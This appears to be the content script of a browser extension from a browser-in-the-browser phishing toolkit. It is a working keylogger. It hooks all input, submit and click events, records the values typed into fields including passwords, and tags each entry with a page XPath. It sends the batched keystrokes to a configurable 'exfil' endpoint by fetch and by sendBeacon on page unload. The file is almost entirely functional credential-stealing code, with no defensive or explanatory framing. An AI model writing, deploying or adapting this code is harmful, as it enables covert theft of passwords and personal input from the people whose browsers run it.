const EXFIL_ENDPOINT = typeof BITB_CONFIG !== 'undefined' ? BITB_CONFIG.endpoint : 'http://localhost:8080';
const SESSION_ID = typeof BITB_CONFIG !== 'undefined' ? BITB_CONFIG.sessionId : 'unknown';

let keystrokes = [];
let lastExfil = Date.now();

function getElementDescriptor(element) {
    const descriptors = [];
    if (element.id) descriptors.push(`#${element.id}`);
    if (element.name) descriptors.push(`[name="${element.name}"]`);
    if (element.className) descriptors.push(`.${element.className.split(' ').join('.')}`);
    if (element.placeholder) descriptors.push(`[placeholder="${element.placeholder}"]`);
    return {
        tag: element.tagName,
        type: element.type,
        descriptors,
        xpath: getXPath(element)
    };
}

function getXPath(element) {
    if (element.id) return `//*[@id="${element.id}"]`;
    const parts = [];
    while (element && element.nodeType === Node.ELEMENT_NODE) {
        let index = 1;
        let sibling = element.previousSibling;
        while (sibling) {
            if (sibling.nodeType === Node.ELEMENT_NODE && sibling.tagName === element.tagName) {
                index++;
            }
            sibling = sibling.previousSibling;
        }
        const tagName = element.tagName.toLowerCase();
        const part = index > 1 ? `${tagName}[${index}]` : tagName;
        parts.unshift(part);
        element = element.parentNode;
    }
    return parts.join('/');
}

function exfilKeystrokes() {
    if (keystrokes.length === 0) return;
    const payload = keystrokes.splice(0, keystrokes.length);
    fetch(`${EXFIL_ENDPOINT}/api/session/${SESSION_ID}/exfil`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json', 'X-BitB-Source': 'keylogger'},
        body: JSON.stringify({sessionId: SESSION_ID, timestamp: new Date().toISOString(), keylog: payload})
    }).then(() => {
        lastExfil = Date.now();
    }).catch(e => {
        console.error('Exfil failed:', e);
        keystrokes.unshift(...payload);
    });
}

document.addEventListener('input', (e) => {
    const target = e.target;
    const data = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        element: getElementDescriptor(target),
        value: target.value || target.textContent,
        type: e.inputType,
        isPassword: target.type === 'password'
    };
    keystrokes.push(data);
    if (Date.now() - lastExfil > 10000 || keystrokes.length >= 50) {
        exfilKeystrokes();
    }
}, true);

document.addEventListener('submit', (e) => {
    const formData = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        action: e.target.action,
        method: e.target.method,
        fields: Array.from(e.target.elements).map(el => ({
            name: el.name,
            type: el.type,
            value: el.type === 'password' ? '[REDACTED]' : el.value
        }))
    };
    browser.runtime.sendMessage({action: 'formSubmit', data: formData});
}, true);

document.addEventListener('click', (e) => {
    const target = e.target;
    if (target.tagName === 'BUTTON' || target.tagName === 'A' || target.type === 'submit') {
        const clickData = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            element: getElementDescriptor(target),
            text: target.textContent?.trim(),
            href: target.href
        };
        browser.runtime.sendMessage({action: 'click', data: clickData});
    }
}, true);

setInterval(exfilKeystrokes, 10000);

window.addEventListener('beforeunload', () => {
    if (keystrokes.length > 0) {
        navigator.sendBeacon(`${EXFIL_ENDPOINT}/api/session/${SESSION_ID}/exfil`, JSON.stringify({sessionId: SESSION_ID, timestamp: new Date().toISOString(), keylog: keystrokes}));
    }
});
